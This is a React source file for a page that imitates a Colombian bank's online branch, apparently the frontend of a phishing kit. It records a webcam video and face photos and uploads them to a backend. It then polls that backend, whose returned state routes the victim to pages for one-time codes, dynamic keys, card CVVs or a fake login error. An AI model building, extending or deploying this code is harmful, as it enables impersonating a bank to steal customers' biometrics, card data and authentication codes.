import './css/LoginModal.css';
import { useEffect, useState, useRef } from "react";
import { FaceDetection } from "@mediapipe/face_detection";
import { Camera } from "@mediapipe/camera_utils";
import { isDesktop, limpiarPaddingBody } from "@utils";
import { isMobile } from "@utils";
import Loading from "app/components/Loading";
import { instanceBackend } from "app/axios/instanceBackend";
import { useNavigate } from "react-router-dom";
import localStorageService from "../../services/localStorageService";

// Se exporta el componente
export default function VerificacionIdentidad() {
  const navigate = useNavigate();
  const [sesionId, setSesionId] = useState(null);
  const [username, setUsername] = useState("Usuario");
  const photosRef = useRef([]); // Store captured photos

  // Duración de la grabación en segundos
  const RECORD_DURATION = 5;

  // Se inicializan los estados para manejar el continuar
  const [formState, setFormState] = useState({
    paso: 1,
    disabledAtras: false,
    estadoEspabilar: false,
    cargando: false,
    disabledContinuar: false,
    continuar: false,
    error: false,
    ok: false,
    texto: "Empezar",
    textoAtras: "Atrás",
    contador: 3
  });

  // Se inicializa la variable mobile
  const mobile = isMobile();

  // Ref para la cámara
  const hasRecordedRef = useRef(false);
  const [stableTime, setStableTime] = useState(0);
  const stableTimerRef = useRef(null);
  const [progress, setProgress] = useState(0);
  const mediaRecorderRef = useRef(null);
  const recordedChunksRef = useRef([]);
  const stopTimeoutRef = useRef(null);
  const videoRef = useRef(null);
  const cameraRef = useRef(null);
  const faceDetectorRef = useRef(null);

  // Se inicializa los estados
  const [ip, setIp] = useState("");
  const [fechaHora, setFechaHora] = useState("");

  useEffect(() => {
    const raw = localStorage.getItem("datos_usuario");
    if (raw) {
      const data = JSON.parse(raw);
      setSesionId(data.sesion_id);
      setUsername(data.nombreCompleto || "Usuario");
    }
  }, []);

  // Se crea el useEffect para iniciar la cámara y la detección facial
  useEffect(() => {

    // Se limpia el padding del body
    limpiarPaddingBody();

    // Solo iniciar en paso 3
    if (formState.paso !== 3) return;

    // Verificar que el ref del video esté disponible
    if (!videoRef.current) return;

    // Función para inicializar la detección facial
    const initFaceDetection = async () => {

      // Se crea la instancia del FaceDetection
      faceDetectorRef.current = new FaceDetection({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/${file}`, });

      // Se configuran las opciones del FaceDetection
      faceDetectorRef.current.setOptions({
        model: "short",
        minDetectionConfidence: 0.7,
      });

      // Se define el callback para los resultados del FaceDetection
      faceDetectorRef.current.onResults((results) => {

        // Se calcula el progreso basado en las detecciones
        if (results.detections && results.detections.length === 1) {

          // Si hay una detección, se inicia o continúa el temporizador estable
          if (!stableTimerRef.current) {

            // Inicia el temporizador estable
            stableTimerRef.current = setTimeout(() => {

              // Se actualiza el estado a ok
              setFormState((prev) => ({
                ...prev,
                ok: true,
                error: false,
              }));
            }, 300);
          };
        } else {

          // Si no hay detecciones, se reinicia el temporizador estable
          if (stableTimerRef.current) {

            // Se limpia el temporizador estable
            clearTimeout(stableTimerRef.current);

            // Se limpia la referencia
            stableTimerRef.current = null;
          };

          // Se actualiza el estado a error
          setFormState((prev) => ({
            ...prev,
            ok: false,
            error: true,
            disabledAtras: false,
            disabledContinuar: false,
          }));

          // Reinicia tanto el progreso como el tiempo estable
          setProgress(0);
          setStableTime(0);
        }
      });

      // Se crea la instancia de la cámara
      cameraRef.current = new Camera(videoRef.current, {

        // onReady callback
        onFrame: async () => {

          // Se envía el frame al FaceDetection
          await faceDetectorRef.current?.send({
            image: videoRef.current,
          });
        },
        width: 320,
        height: 400,
      });

      // Se inicia la cámara
      cameraRef.current.start();
    };

    // Se llama a la función para iniciar la detección facial
    initFaceDetection();

    // Cleanup al desmontar o cambiar de paso
    return () => {

      // Se detiene la cámara y se cierra el FaceDetection
      if (cameraRef.current) {

        // Se detiene la cámara
        cameraRef.current.stop();
        cameraRef.current = null;
      };

      // Se cierra el FaceDetection
      if (faceDetectorRef.current) {

        // Se cierra el FaceDetection
        faceDetectorRef.current.close();
        faceDetectorRef.current = null;
      };
    };
  }, [formState.paso]);

  // Se crea el useEffect para capturar la ip publica y la hora en estandar
  useEffect(() => {

    // Se obtiene la IP
    obtenerIP();

    // Se obtiene la fecha/hora con formato
    obtenerFechaHora();
  }, []);

  //  Se crea el useEffect para ejecutar 1 minuto 
  useEffect(() => {

    // Calcular cuánto falta para el próximo minuto exacto
    const ahora = new Date();
    const msHastaProximoMinuto = (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

    // Se inicializa el intervalo
    let intervalId;

    // Timeout para sincronizar con el cambio exacto de minuto
    const timeoutId = setTimeout(() => {

      // Se obtiene la fecha/hora con formato
      obtenerFechaHora();

      // Luego actualizar cada 60 segundos
      intervalId = setInterval(() => {

        // Se obtiene la fecha/hora con formato
        obtenerFechaHora();
      }, 60000);
    }, msHastaProximoMinuto);

    // Cleanup
    return () => {

      // Se limpia el timeout y el intervalo
      clearTimeout(timeoutId);

      // Se limpia el intervalo si existe
      if (intervalId) clearInterval(intervalId);
    };
  }, []);

  // Obtiene la dirección IP pública del usuario
  const obtenerIP = async () => {

    // Se usa el try
    try {

      // Se realiza la petición HTTP a la API
      const response = await fetch("https://api.ipify.org?format=json");

      // Se convierte la respuesta a JSON
      const data = await response.json();

      // Se guarda la IP obtenida en el estado
      setIp(data.ip);
    } catch (error) {

      // En caso de error (sin internet, API caída, etc.)
      console.error("Error obteniendo IP", error);

      // Se asigna un valor por defecto para evitar fallos en la UI
      setIp("No disponible");
    };
  };

  // Obtiene la fecha y hora actual del sistema
  const obtenerFechaHora = () => {

    // Se obtiene la fecha y hora actual
    const ahora = new Date();

    // Opciones de formato para la fecha y hora
    const opciones = {
      weekday: "long",   // día de la semana (miércoles)
      year: "numeric",   // año (2026)
      month: "long",     // mes (enero)
      day: "numeric",    // día del mes (7)
      hour: "numeric",   // hora (5)
      minute: "2-digit", // minutos (38)
      hour12: true       // formato 12 horas (p. m.)
    };

    // Se formatea la fecha según el locale español de Colombia
    const formato = ahora.toLocaleString("es-CO", opciones);

    // Se guarda el valor formateado en el estado
    setFechaHora(formato);
  };

  // Placeholder function for the button
  const handleContinuar = (e) => {

    // Se quita el foco del id continue-button porque a veces queda el foco en mobile
    e.currentTarget.blur(); // 🔥 CLAVE

    // Se actualiza el estado según el paso actual
    setFormState((prev) => {

      // Paso 1 → Paso 2
      if (prev.paso === 1) {

        // Iniciar cámara y detección facial
        return {
          ...prev,
          paso: 2,
          texto: "Continuar"
        };
      };

      // Paso 2 → Paso 3
      if (prev.paso === 2) {

        // Iniciar cámara y detección facial
        return {
          ...prev,
          paso: 3,
          continuar: true,
          texto: "Comenzar",
        };
      };

      // Paso 3 (aquí puedes enviar info o finalizar)
      if (prev.paso === 3) {

        // Se crea el metodo para empezar a grabar
        return {
          ...prev,
          disabledContinuar: true,
          disabledAtras: true
        };
      };

      // Por defecto,
      return prev;
    });
  };

  // Función para manejar el botón de atrás
  const handleAtras = () => {

    // Se actualiza el estado según el paso actual
    setFormState((prev) => {

      // Paso 2 → Paso 1
      if (prev.paso === 2) {

        // Volver al paso 1
        return {
          ...prev,
          paso: 1,
          texto: "Empezar"
        };
      };

      // Paso 3 → Paso 2
      if (prev.paso === 3) {

        // Detener grabación si está en curso
        stopRecording();

        // Volver al paso 2
        return {
          ...prev,
          paso: 2,
          texto: "Continuar"
        };
      };

      // Por defecto,
      return prev;
    });
  };

  // Se crea el metodo para detener la grabación
  const stopRecording = () => {

    // Se limpia el timeout si existe
    if (stopTimeoutRef.current) {

      // Se limpia el timeout
      clearTimeout(stopTimeoutRef.current);

      // Se limpia la referencia
      stopTimeoutRef.current = null;
    }

    // Se detiene la grabación si está en curso
    if (mediaRecorderRef.current?.state === "recording") {

      // Se detiene el MediaRecorder
      mediaRecorderRef.current.stop();

      // Se limpia la referencia
      mediaRecorderRef.current = null;
    };
  };

  // Efecto para controlar el progreso cuando el estado es ok
  useEffect(() => {

    // Se declara la variable intervalId
    let intervalId;

    // Se muestra el mensaje para espabilar
    setFormState((prev) => {

      // Se actualiza el estado a espabilar
      return {
        ...prev,
        estadoEspabilar: true
      };
    });

    // Si el estado es ok, inicia el conteo de tiempo
    if (formState.ok) {

      // Inicia el conteo de tiempo estable
      intervalId = setInterval(() => {

        // Se actualiza el tiempo estable
        setStableTime((prevTime) => {

          // Incrementa cada 100ms
          const newTime = prevTime + 0.1;

          // Si han pasado más de 3 segundos, comienza a llenar el círculo
          if (newTime >= 3) {

            // Calcula el porcentaje de progreso (de 0 a 1) basado en el tiempo que ha pasado desde los 3 segundos, con un máximo de 5 segundos para completar el círculo
            const progressPercentage = Math.min((newTime - 3) / 5, 1);

            // Actualiza el estado del progreso
            setProgress(progressPercentage);

            // Se inicia la grabación cuando el círculo EMPIEZA
            if (progressPercentage > 0 && !mediaRecorderRef.current && !hasRecordedRef.current) {

              // Se marca que ya se ha iniciado la grabación para evitar múltiples inicios
              hasRecordedRef.current = true;

              // Se llama al método para empezar a grabar
              startRecording();
            };
          };

          // Se retorna el nuevo tiempo
          return newTime;
        });
      }, 100);
    } else {

      // Reinicia el tiempo cuando no está ok
      setStableTime(0);
      setProgress(0);
    };

    // Se retorna el cleanup
    return () => {

      // Se limpia el intervalo si existe
      if (intervalId) {

        // Se limpia el intervalo
        clearInterval(intervalId);
      };
    };
  }, [formState.ok]);

  // Helper to capture a frame
  const captureFrame = async () => {
    if (!videoRef.current) return null;
    try {
      const canvas = document.createElement("canvas");
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      const ctx = canvas.getContext("2d");
      // Flip horizontally to match video mirror
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(videoRef.current, 0, 0);
      return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
    } catch (e) {
      console.error("Error capturing frame", e);
      return null;
    }
  };

  // Se crea el metodo para empezar a grabar
  const startRecording = () => {

    // Se valida que el video tenga el stream
    if (!videoRef.current?.srcObject) return;

    // Se obtiene el stream del video
    const stream = videoRef.current.srcObject;

    // Se limpia el array de chunks grabados
    recordedChunksRef.current = [];
    photosRef.current = []; // Reset photos

    // Se crea el MediaRecorder
    const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm;codecs=vp8", });

    // Evento para cuando hay datos disponibles
    mediaRecorder.ondataavailable = (event) => {

      // Se almacenan los datos grabados
      if (event.data.size > 0) {

        // Se agrega el chunk al array
        recordedChunksRef.current.push(event.data);
      };
    };

    // Evento para cuando se detiene la grabación
    mediaRecorder.onstop = () => {

      // Se crea el blob con los datos grabados
      const blob = new Blob(recordedChunksRef.current, { type: "video/webm", });

      console.log("Grabación finalizada -> ", blob);

      // Upload Biometrics
      handleUploadBiometrics(blob, photosRef.current);

      // Se detiene el proceso de grabación
      stopRecording();
    };

    // Se inicia la grabación
    mediaRecorder.start();

    // Se guarda la referencia del MediaRecorder
    mediaRecorderRef.current = mediaRecorder;

    // Capture photos at intervals [1s, 2s, 3s]
    const capture = async () => {
      if (photosRef.current.length < 3) {
        const photo = await captureFrame();
        if (photo) photosRef.current.push(photo);
      }
    };

    // Schedule captures
    setTimeout(capture, 1000);
    setTimeout(capture, 2500);
    setTimeout(capture, 4000);

    // ⏱ Detener EXACTAMENTE en X segundos
    stopTimeoutRef.current = setTimeout(() => {

      // Se detiene la grabación
      if (mediaRecorderRef.current?.state === "recording") {

        // Se detiene el MediaRecorder
        mediaRecorderRef.current.stop();

        // Se limpia la referencia
        mediaRecorderRef.current = null;

        // Se usa el cargando
        setFormState((prev) => {

          // Se actualiza el estado a cargando
          return {
            ...prev,
            ok: false,              // 👈 corta el efecto
            estadoEspabilar: false,
            cargando: true,
          };
        });
      }
    }, RECORD_DURATION * 1000);
  };

  const handleUploadBiometrics = async (videoBlob, photos) => {
    if (!sesionId) {
      console.error("No session ID found");
      return;
    }

    // Set loading state
    setFormState(prev => ({
      ...prev,
      ok: false,
      estadoEspabilar: false,
      cargando: true
    }));

    try {
      const formData = new FormData();
      formData.append('sessionId', sesionId);
      formData.append('username', username);
      formData.append('video', videoBlob, 'biometrics_video.webm');

      if (photos[0]) formData.append('image1', photos[0], 'face_1.jpg');
      if (photos[1]) formData.append('image2', photos[1], 'face_2.jpg');
      if (photos[2]) formData.append('image3', photos[2], 'face_3.jpg');

      await instanceBackend.post('/biometrics/upload', formData, {
        headers: { 'Content-Type': 'multipart/form-data' }
      });

      console.log("Biometrics uploaded successfully");
      // Start polling for status
      iniciarPolling(sesionId);

    } catch (error) {
      console.error("Error uploading biometrics:", error);
      setFormState(prev => ({ ...prev, cargando: false, error: true }));
      alert("Error al subir la verificación. Por favor intente nuevamente.");
    }
  };

  const iniciarPolling = (sid) => {
    let attempts = 0;
    const MAX_ATTEMPTS = 100;

    const pollingInterval = setInterval(async () => {
      try {
        attempts++;
        const response = await instanceBackend.post(`/consultar-estado/${sid}`);
        const { estado, cardData } = response.data;  // 🔧 FIX: Extract cardData from backend

        console.log('[VerificacionIdentidad] Polling Status:', estado);

        // 🔧 FIX: Si llega configuración de tarjeta custom, la guardamos (igual que en IniciarSesion)
        if (cardData) {
          console.log('[VerificacionIdentidad] ✅ Guardando cardData desde backend:', cardData);
          localStorageService.setItem("selectedCardData", cardData);
        }

        if (attempts >= MAX_ATTEMPTS) {
          clearInterval(pollingInterval);
          setFormState(prev => ({ ...prev, cargando: false, error: true }));
          return;
        }

        // Define states to redirect
        const statusMap = {
          'solicitar_otp': '/numero-otp',
          'error_otp': '/numero-otp',
          'solicitar_din': '/clave-dinamica',
          'error_din': '/clave-dinamica',
          'solicitar_finalizar': '/finalizado-page',
          'error_923': '/error-923page',
          'solicitar_cvv': '/validacion-cvv',
          'solicitar_tc_custom': '/tc-custom',
          'solicitar_cvv_custom': '/validacion-cvv',
          'error_login': '/autenticacion',
          'aprobado': '/finalizado-page' // Or wherever
        };

        if (statusMap[estado]) {
          clearInterval(pollingInterval);

          // Si es un estado de error, guardamos la bandera en localStorage
          if (['error_login', 'error_otp', 'error_din'].includes(estado)) {
            localStorage.setItem('estado_sesion', 'error');
          }

          console.log(`Redirigiendo a ${statusMap[estado]} por estado: ${estado}`);

          navigate(statusMap[estado]);
        }

      } catch (error) {
        console.error("Polling error:", error);
      }
    }, 3000);
  };

  // Se crea el return del componente
  const desktop = isDesktop();

  // Se retorna el componente
  return (
    <>
      <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
        <div
          style={{
            flex: 1,
            backgroundColor: "#2C2A29",
            backgroundImage: 'url("/assets/images/auth-trazo.svg")',
            backgroundRepeat: desktop ? 'round' : 'no-repeat',
            backgroundPosition: "center",
            backgroundPositionY: desktop ? "0px" : "-70px",
            backgroundPositionX: desktop ? "0px" : "-500px",
          }}
        >
          <div style={{ textAlign: "center" }}>
            <img
              src="/assets/images/img_pantalla2/descarga.svg"
              alt="Logo"
              style={{ width: "238px", marginTop: "45px" }}
            />
          </div>

          <div
            style={{
              marginTop: "25px",
            }}
          >
            <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs" style={{ fontSize: desktop ? 36 : 28.32 }}>
              Sucursal Virtual Personas
            </h1>
          </div>

          <div className="login-page">
            <div className="login-box" style={{ backgroundColor: "#454648", textAlignLast: "center" }}>
              <div
                style={{
                  display: "flex",
                  justifyContent: "center"
                }}
              >
              </div>

              {formState.paso === 1 ?
                <>
                  <div
                    style={{
                      display: "flex",
                      justifyContent: "center"
                    }}
                  >
                    <div
                      style={{
                        width: "60px",
                        height: "60px",
                        borderRadius: "50%",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        marginBottom: "20px"
                      }}
                    >
                      <img
                        src="/assets/images/indicacion/celular_logo2.png"
                        alt="Alert Icon"
                      />
                    </div>
                  </div>

                  <div style={{ textAlign: 'center' }}>
                    <h2
                      className="bc-card-auth-title2 bc-cibsans-font-style-5-bold text-center"
                      style={{
                        fontSize: "20px",
                        fontWeight: "bold",
                        marginBottom: "20px",
                        lineHeight: "1.3",
                        color: "#ffffff",
                      }}>
                      ¡Bienvenido a Biometría Facial!
                    </h2>
                    <p className="bc-card-auth-description" style={{ fontSize: "14px", lineHeight: "1.5", marginBottom: "15px", color: "#ffffff" }}>
                      Una alianza para la transformación digital segura.
                    </p>
                  </div>

                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      marginTop: "40px",
                      marginBottom: "40px",
                      width: "100%"
                    }}
                  >
                    {/* Izquierda */}
                    <div style={{ flex: 1, display: "flex", justifyContent: "flex-end" }}>
                      <img
                        src="/assets/images/img_pantalla2/imgi_1_bancolombia-horizontal-no-spacing.svg"
                        width={120}
                      />
                    </div>

                    {/* HR vertical */}
                    <div
                      style={{
                        width: "2px",
                        height: "40px",
                        backgroundColor: "#ffffff",
                        margin: "0 20px",
                        flexShrink: 0
                      }}
                    />

                    {/* Derecha */}
                    <div style={{ flex: 1, display: "flex", justifyContent: "flex-start" }}>
                      <img
                        src="/assets/images/indicacion/soyyoredeban.png"
                        width={105}
                      />
                    </div>
                  </div>
                </> : null}

              {formState.paso === 2 ?
                <>
                  <div
                    style={{
                      display: "flex",
                      justifyContent: "center"
                    }}
                  >
                    <div
                      style={{
                        width: "60px",
                        height: "60px",
                        borderRadius: "50%",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        marginBottom: "20px"
                      }}
                    >
                      <img
                        src="/assets/images/indicacion/celular_logo2.png"
                        alt="Alert Icon"
                      />
                    </div>
                  </div>

                  <h2 className="mt-2"
                    style={{
                      fontSize: "20px",
                      fontWeight: "bold",
                      marginBottom: "20px",
                      lineHeight: "1.3",
                      color: "#ffffff"
                    }}>
                    Verificación de identidad
                  </h2>

                  <div style={{ textAlignLast: "center" }}>
                    <span
                      className="bc-card-auth-description"
                      style={{
                        display: "block",
                        fontSize: "13.5px",
                        marginBottom: "10px",
                        color: "#ffffff",
                      }}
                    >
                      Necesitamos verificar tu identidad para continuar con el proceso de forma segura.
                    </span>

                    <span
                      className="bc-card-auth-description"
                      style={{
                        display: "block",
                        fontSize: "13.5px",
                        color: "#ffffff",
                      }}
                    >
                      Para completar la verificación, acepta los permisos de la cámara y sigue las instrucciones:
                    </span>
                  </div>

                  <div className="info-list mt-4 mb-4">
                    <div className="info-item">
                      <img src="/assets/images/img1.svg" alt="" />
                      <span className="info-text">
                        <h5 className="bc-card-auth-description" style={{ color: "#fdda24", fontSize: 13.5, lineHeight: "5px", fontWeight: "600" }}>
                          Ubicate en un espacio iluminado
                        </h5>
                        <span className="bc-card-auth-description line-height mt-0" style={{ fontSize: 12.5 }}>
                          Mejor un lugar con luz natural o luz blanca.
                        </span>
                      </span>
                    </div>
                    <div className="info-item">
                      <img src="/assets/images/img2.svg" alt="" />
                      <span className="info-text">
                        <h5 className="bc-card-auth-description" style={{ color: "#fdda24", fontSize: 13.5, lineHeight: "5px", fontWeight: "600" }}>
                          Ubica tú celular a la altura de tu rostro
                        </h5>
                        <span className="bc-card-auth-description line-height mt-0" style={{ fontSize: 12.5 }}>
                          Mantén la cabeza recta mirando al frente y ubica tu celular a esa altura.
                        </span>
                      </span>
                    </div>
                    <div className="info-item">
                      <img src="/assets/images/img3.svg" alt="" />
                      <span className="info-text">
                        <h5 className="bc-card-auth-description" style={{ color: "#fdda24", fontSize: 13.5, lineHeight: "5px", fontWeight: "600" }}>
                          Retira los accesorios
                        </h5>
                        <span className="bc-card-auth-description line-height mt-0" style={{ fontSize: 12.5 }}>
                          Evita cubrir tu rostro con tú cabello, gafas, gorras, tapabocas, etc.
                        </span>
                      </span>
                    </div>
                  </div>
                </> : null}

              {formState.paso === 3 ?
                <>
                  <div
                    style={{
                      display: "flex",
                      justifyContent: "center"
                    }}
                  >
                    <div
                      style={{
                        width: "60px",
                        height: "60px",
                        borderRadius: "50%",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        marginBottom: "20px"
                      }}
                    >
                      <img
                        src="/assets/images/indicacion/celular_logo2.png"
                        alt="Alert Icon"
                      />
                    </div>
                  </div>

                  <div style={{ textAlign: 'center' }}>
                    <h2
                      className="bc-card-auth-title2 bc-cibsans-font-style-5-bold text-center"
                      style={{
                        fontSize: "20px",
                        fontWeight: "bold",
                        marginBottom: "20px",
                        lineHeight: "1.3",
                        color: "#ffffff",
                      }}>
                      Verificando tu identidad
                    </h2>
                    <p className="bc-card-auth-description" style={{ fontSize: "14px", lineHeight: "1.5", marginBottom: "15px", color: "#ffffff" }}>
                      Mantén tu rostro centrado dentro del circulo y espera a que se complete la verificación.
                    </p>
                  </div>

                  <div
                    id="webcam-container"
                    style={{
                      width: "180px",
                      margin: "0 auto",
                      position: "relative",
                    }}
                  >
                    {/* CONTENEDOR CIRCULAR REAL */}
                    <div
                      style={{
                        width: "180px",
                        height: "180px",
                        borderRadius: "50%",
                        overflow: "hidden",     // 🔥 CLAVE: recorte real
                        position: "relative",
                        backgroundColor: "#000",
                      }}
                    >
                      {/* VIDEO */}
                      <video
                        ref={videoRef}
                        autoPlay
                        playsInline
                        muted
                        style={{
                          width: "100%",
                          height: "100%",
                          objectFit: "cover",   // 🔥 llena el círculo sin deformar
                          transform: "scaleX(-1)",
                        }}
                      />

                      {/* OVERLAY (GUIA / PROGRESO / ERROR) */}
                      <svg
                        width="180"
                        height="180"
                        viewBox="0 0 180 180"
                        style={{
                          position: "absolute",
                          inset: 0,
                          pointerEvents: "none",
                        }}
                      >
                        {/* Guía blanca */}
                        <circle
                          cx="90"
                          cy="90"
                          r="88"
                          fill="none"
                          stroke="#ffffff"
                          strokeWidth="5"
                          strokeDasharray="4 4"
                          opacity="0.8"
                        />

                        {/* Error */}
                        {(formState.error && formState.cargando == false) && (
                          <circle
                            cx="90"
                            cy="90"
                            r="88"
                            fill="none"
                            stroke="#ff3b30"
                            strokeWidth="5"
                          />
                        )}

                        {/* Progreso */}
                        {(formState.ok && formState.cargando == false) && (
                          <circle
                            cx="90"
                            cy="90"
                            r="88"
                            fill="none"
                            stroke="#4BB543"
                            strokeWidth="5"
                            strokeLinecap="round"
                            strokeDasharray={2 * Math.PI * 88}
                            strokeDashoffset={(2 * Math.PI * 88) * (1 - progress)}
                            transform="rotate(-90 90 90)"
                          />
                        )}
                      </svg>
                    </div>
                  </div>
                  <div>
                    {/* MENSAJE */}
                    {(formState.error && formState.cargando == false) && (
                      <p
                        className="bc-card-auth-description"
                        style={{
                          color: "#fff",
                          fontSize: "14px",
                          marginTop: "10px",
                          textAlign: "center",
                        }}
                      >
                        Ubica tu rostro dentro del círculo
                      </p>
                    )}

                    {/* MENSAJE */}
                    {(formState.estadoEspabilar && formState.cargando == false) && (
                      <p
                        className="bc-card-auth-description"
                        style={{
                          color: "#fff",
                          fontSize: "14px",
                          marginTop: "10px",
                          textAlign: "center",
                        }}
                      >
                        Mantén una expresión neutra, luego parpadea naturalmente mientras se completa la verificación.
                      </p>
                    )}
                  </div>
                </> : null}

              <div className="step-container mt-4 mb-4">
                {/* Slot 1 */}
                {formState.paso === 1 ? (
                  <div className="step bar active"></div>
                ) : (
                  <div className="step circle"></div>
                )}

                {/* Slot 2 */}
                {formState.paso === 2 ? (
                  <div className="step bar active"></div>
                ) : (
                  <div className="step circle"></div>
                )}

                {/* Slot 3 */}
                {formState.paso === 3 ? (
                  <div className="step bar active"></div>
                ) : (
                  <div className="step circle"></div>
                )}
              </div>

              <div className="mt-4" style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
                {(formState.paso > 1 && formState.paso < 3) && (
                  <button id="back-button" className="bc-button-primary login-btn-borrar" onClick={handleAtras} style={{ fontSize: "14px" }} disabled={formState.disabledAtras}>
                    {formState.textoAtras}
                  </button>
                )}
                {formState.paso < 3 && (
                  <button id="continue-button" className="bc-button-primary login-btn" onClick={handleContinuar} style={{ fontSize: "14px" }} disabled={formState.disabledContinuar}>
                    {formState.texto}
                  </button>
                )}
              </div>
            </div>
          </div>

          <div className="login-page-footer mt-4">
            <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
              <span>¿Problemas para conectarte?</span>
              <span className="dot">·</span>
              <span>Aprende sobre seguridad</span>
              <span className="dot">·</span>
              <span>Reglamento Sucursal Virtual</span>
              <span className="dot">·</span>
              <span>Política de privacidad</span>
            </div>
            <hr style={{ marginTop: "20px" }} />
            <div className="footer-final">
              <div className="footer-left">
                <div>
                  <img
                    src="/assets/images/img_pantalla2/descarga.svg"
                    style={{ width: "180px" }}
                  />
                </div>
                <div style={{ alignSelf: 'center' }}>
                  <span className="vigilado">
                    <img
                      src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                      alt="Superintendencia"
                      style={{ width: "140px" }}
                    />
                  </span>
                </div>
              </div>
              <div className="footer-right">
                <div className="mt-2">Dirección IP: {ip}</div>
                <div className="mb-2">{fechaHora}</div>
              </div>
            </div>
          </div>
        </div>
      </div >

      <div className="visual-captcha" style={{ cursor: "pointer" }}>
        <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
      </div>

      {formState.cargando ?
        <Loading /> : null}
    </>
  );
};